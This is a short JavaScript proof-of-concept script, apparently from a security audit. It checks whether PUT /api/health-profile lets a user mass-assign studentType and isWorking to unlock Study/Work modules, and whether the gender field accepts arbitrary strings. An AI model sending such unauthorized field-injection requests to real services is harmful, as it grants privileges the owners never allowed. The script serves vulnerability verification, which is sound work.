// §7/§8/§6-note: mass-assignment on PUT /api/health-profile.
// The Health page only edits height/weight/birthYear/gender, but the request record
// also binds StudentType & IsWorking -> user can self-grant Study/Work modules via this endpoint.
// Also: Gender has NO enum validation (any string accepted).
import { provision, api } from '../_lib/provision.mjs'

// Start as a user with NO study and NOT working.
const u = await provision({ email: 'adv.t07.mass@gmail.com', gender: 'female', studentType: 'none', isWorking: false })
const before = await api('GET', '/api/health-profile', { token: u.token })
console.log(`[before] ${before.text}`)

// Send extra fields that the Health UI never sends.
const r = await api('PUT', '/api/health-profile', { token: u.token,
  body: { weight: 60, height: 165, birthYear: 1995, gender: 'attacker-controlled-🏴', studentType: 'student', isWorking: true } })
console.log(`[PUT health-profile w/ studentType+isWorking+junk gender] -> ${r.status}`)

const after = await api('GET', '/api/health-profile', { token: u.token })
console.log(`[after] ${after.text}`)

const gotStudent = after.json?.studentType === 'student'
const gotWorking = after.json?.isWorking === true
const gotJunkGender = after.json?.gender === 'attacker-controlled-🏴'

console.log('---')
if (gotStudent && gotWorking)
  console.log(`CONFIRMED: mass-assignment — studentType now "${after.json.studentType}", isWorking=${after.json.isWorking} via /api/health-profile (HealthProfileController.cs:56-59). User self-unlocks Study/Work modules bypassing Settings UI.`)
else
  console.log('NOT CONFIRMED (mass-assignment): studentType/isWorking not persisted')
if (gotJunkGender)
  console.log(`CONFIRMED: Gender accepts arbitrary string "${after.json.gender}" (no enum check, HealthProfileController.cs:56). Cycle module gate is gender==='female' client-side only.`)
else
  console.log(`observed gender=${after.json?.gender}`)
